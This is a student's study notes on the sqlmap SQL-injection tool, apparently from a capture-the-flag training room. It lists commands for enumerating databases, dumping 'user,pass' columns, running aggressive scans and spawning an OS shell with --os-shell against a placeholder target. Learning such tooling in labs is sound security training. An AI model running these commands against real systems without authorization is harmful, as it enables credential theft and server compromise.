# SQLMap: The Basics

**Path:** Cyber Security 101 > Offensive Security Tooling  

**Date Completed:** Feb 09, 2026  

**Difficulty:** Easy

---

## Summary
SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It is essential because it can handle complex injection types (Blind, Error-based, Time-based) and automate the tedious data extraction process that would otherwise take hours of manual effort.

---

## Key Concepts
* SQLMap can ingest direct URLs, POST data, or raw HTTP request files (exported from Burp Suite) to identify injection points precisely.
* Data extraction follows a logical hierarchy: Databases -> Tables -> Columns -> Data (Dump).
* Controlled by `level` (where to look, e.g., headers/cookies) and `risk` (how aggressive/destructive the payloads are to the database integrity).
* Beyond data theft, SQLMap can read system files or attempt to spawn an OS-level shell if the database user has sufficient permissions (like `FILE` privileges).



---

## Commands & Tools
```bash
# Basic GET injection with auto-accept prompts (essential for CTFs)
sqlmap -u "(http://target.com/page.php?id=1" --batch

# Injecting via a saved Burp Suite request file (the most reliable method)
sqlmap -r request.txt --batch

# Targeting a specific parameter to avoid "noise" and save time
sqlmap -u "(http://target.com/p.php?id=1&user=test" -p id

# Standard Enumeration: DBs -> Tables -> Columns -> Dump
sqlmap -r req.txt --dbs
sqlmap -r req.txt -D <db_name> --tables
sqlmap -r req.txt -D <db_name> -T <table_name> --columns
sqlmap -r req.txt -D <db_name> -T <table_name> -C "user,pass" --dump

# High intensity scan (checks Headers/Cookies with aggressive payloads)
sqlmap -u "[http://target.com](http://target.com)" --level=5 --risk=3

# Checking for administrative rights and attempting an OS shell
sqlmap -r req.txt --is-dba
sqlmap -r req.txt --os-shell
```

---

## What I Learned
- Manually answering "Y/n" to every heuristic check is a massive time sink; always use `--batch` mode in competitive environments unless fine-tuning.
- Using -r with a raw request file is superior to -u because it preserves headers, cookies, and complex POST formatting that SQLMap might otherwise miss.
- Risk vs. Level: Level refers to the depth of the search (Headers, Referer, etc.), while Risk refers to the danger of the payload (potential to crash the DB or cause DoS).
- Using `--technique=E` (Error-based) or `--technique=B` (Boolean-blind) can drastically speed up scans if the injection type is already known.
- `--os-shell` is powerful but requires three things: a writable directory, a known absolute web path, and a DB user with administrative/FILE privileges.

References
- [SQLMap Official Usage Documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
